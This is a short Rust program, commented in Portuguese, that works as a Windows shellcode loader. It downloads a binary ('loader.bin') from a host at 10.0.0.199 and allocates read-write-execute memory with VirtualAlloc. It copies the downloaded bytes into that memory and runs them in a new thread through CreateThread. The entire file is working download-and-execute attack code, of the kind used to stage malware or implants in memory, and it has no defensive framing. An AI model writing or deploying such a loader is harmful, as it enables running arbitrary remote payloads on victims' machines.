use reqwest;
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE};
use std::ptr::null_mut;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    
    let url = "http://10.0.0.199/loader.bin";

    // Ele baixa o binário usando a lib reqwest 
    let response = reqwest::get(url).await?.bytes().await?;

    // Coloocando como matriz de bytes
    let bin_data = response.to_vec();

    unsafe {
        // Alocando a memória para o binário
        let func_addr = VirtualAlloc(
            null_mut(),
            bin_data.len(),
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        );

        // Verificando se a alocação foi sucedida ou não
        if func_addr.is_null() {
            return Err("Falha ao alocar memória.".into());
        }

        // Copiando para a memória que deve ser alocada
        std::ptr::copy_nonoverlapping(bin_data.as_ptr(), func_addr as *mut u8, bin_data.len());

        let mut thread_id: u32 = 0;

        // Criando uma thread para executar o binário
        let h_thread = CreateThread(
            null_mut(),
            0,
            Some(std::mem::transmute(func_addr)),
            null_mut(),
            0,
            &mut thread_id as *mut u32,
        );

        // Verificando se a thread foi criada
        if h_thread.is_null() {
            return Err("Falha ao criar a thread.".into());
        }

        // aqui ele espera a thread terminar
        WaitForSingleObject(h_thread, 0xFFFFFFFF);
    }

    Ok(())
}
